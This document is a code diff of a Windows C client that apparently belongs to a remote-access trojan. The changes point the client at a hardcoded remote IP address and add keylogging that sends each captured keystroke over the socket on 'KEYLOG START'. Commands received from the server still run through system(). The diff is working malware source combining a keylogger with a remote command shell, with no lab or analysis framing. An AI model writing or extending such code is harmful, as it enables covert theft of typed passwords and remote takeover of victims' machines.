@@ -7,6 +7,7 @@
 #include <string.h>
 
 #include "../commonFiles/common.h"
+#include "keylog.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -31,14 +32,8 @@ int main() {
 
 	serv_addr.sin_family = AF_INET;
 	serv_addr.sin_port = htons(PORT);
-/*
-	if (InetPton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
-		printf("Invalid address\n");
-		WSACleanup();
-		return 1;
-	}
-*/
-	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	serv_addr.sin_addr.s_addr = inet_addr("10.10.195.94");
+
 	if (serv_addr.sin_addr.s_addr == INADDR_NONE) {
 		printf("Invalid address\n");
 		return -1;
@@ -56,7 +51,10 @@ int main() {
 	clearBuffer(buffer, sizeof(buffer));
 
 
+	bool keylogPass = false;
+	char charKey = '\0';
 	while (1) {
+		clearBuffer(buffer, sizeof(buffer));
 		//printf("MESSAGE:");
 		//secureInputString(buffer, sizeof(buffer) - 2);
 		//send(client_fd, buffer, strlen(buffer), 0);
@@ -64,9 +62,21 @@ int main() {
 
 		int valread = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
 		if (valread <= 0) break;
+		if(strcmp(buffer, "EXIT")== 0) break;
+		else if(strcmp(buffer, "KEYLOG START") == 0) {keylogPass = true; printf("OPERATE: %s", buffer);}
+		else if(strcmp(buffer, "KEYLOG STOP") == 0) {keylogPass = false; printf("OPERATE: %s", buffer);}
+
+		if(keylogPass) {
+			charKey = '\0';
+			charKey = logChar(); 
+			printf("SEND: %c\n", charKey);
+			clearBuffer(buffer, sizeof(buffer));
+			sprintf(buffer, "%c", charKey);
+			send(client_fd, buffer, strlen(buffer), 0);
+		}
+
 		buffer[valread] = '\0';
-		system(buffer);
-		clearBuffer(buffer, sizeof(buffer));
+		if(!keylogPass)system(buffer);
 	}
 
 	closesocket(client_fd);
